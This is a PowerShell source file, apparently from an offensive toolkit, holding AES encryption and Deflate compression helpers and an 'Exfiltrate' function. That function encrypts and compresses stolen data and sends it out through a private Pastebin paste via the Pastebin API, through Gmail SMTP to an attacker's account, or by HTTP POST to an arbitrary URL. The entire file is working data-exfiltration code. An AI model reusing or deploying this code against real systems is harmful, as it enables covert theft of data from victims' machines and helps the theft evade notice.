
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString,$base64) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()

    if ($base64 -eq $true){
        return [System.Convert]::ToBase64String($fullData)
    }
    else{
        return $fullData
    }
}

function Encrypt-Bytes($key, $bytes,$base64) {
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()

    if ($base64 -eq $true){
        return [System.Convert]::ToBase64String($fullData)
    }
    else{
        return $fullData
    }
}


function Compress-Encode($bytestream) {
    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
    $ms = New-Object IO.MemoryStream
    $action = [IO.Compression.CompressionMode]::Compress
    $cs = New-Object IO.Compression.DeflateStream ($ms, $action)
    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
    $bytestream | ForEach-Object { $sw.WriteLine($_) }
    $sw.Close()
    # Base64 encode stream
    $code = [Convert]::ToBase64String($ms.ToArray())
    return $code
}

function Compress($bytestream) {
    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
    $ms = New-Object IO.MemoryStream
    $action = [IO.Compression.CompressionMode]::Compress
    $cs = New-Object IO.Compression.DeflateStream ($ms, $action)
    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
    $bytestream | ForEach-Object { $sw.WriteLine($_) }
    $sw.Close()
    return $ms.ToArray()
}

function Exfiltrate {
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ID,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Data,
        
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Key,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $ExfilOption,
    
        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $dev_key,
    
        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $username,

        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $password,
    
        [Parameter(Position = 7, Mandatory = $False)]
        [String]
        $URL

    )
        

    function post_http($url, $parameters) { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 

        return $http_request.responseText 
    } 

    function Encrypt-JSON {

        Param( 
            [Parameter( Mandatory = $true, Position = 0)] 
            [string]$KeyAES,
            [Parameter( Mandatory = $true, Position = 0)] 
            [string]$Payload
        ) 
        
        $SecuredPayload  = Encrypt-Bytes $KeyAES $Payload $True

        return $SecuredPayload 

    }

    if ($exfiloption -eq "pastebin") {

        #$encrypted = Encrypt-JSON -KeyAES $Key -Payload $Data
        $compressed = Compress $Data
        Write-Host "Compression completed size $($compressed.length)"
        $encrypted = Encrypt-Bytes $Key $compressed $True
        
        Write-Host "Encrypted completed size $($encrypted.length)"
        $script:session_key = post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        $ok = post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$ID&api_paste_code=$compressed&api_paste_private=2" 

        return $compressed,$ok
    }


    elseif ($exfiloption -eq "gmail") {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $encrypted = Encrypt-JSON -KeyAES $Key -Payload $Data
        $smtpserver = "smtp.gmail.com"
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
        $msg.From = "$username@gmail.com"
        $msg.To.Add("$username@gmail.com")
        $msg.Subject = $ID
        $msg.Body = $encrypted
        if ($filename) {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
        return $encrypted
    }

    elseif ($exfiloption -eq "webserver") {
        $encrypted = Encrypt-JSON -KeyAES $Key -Payload $Data
        $Data = Compress-Encode $encrypted    
        post_http $URL $Data
        return $encrypted
    }

}
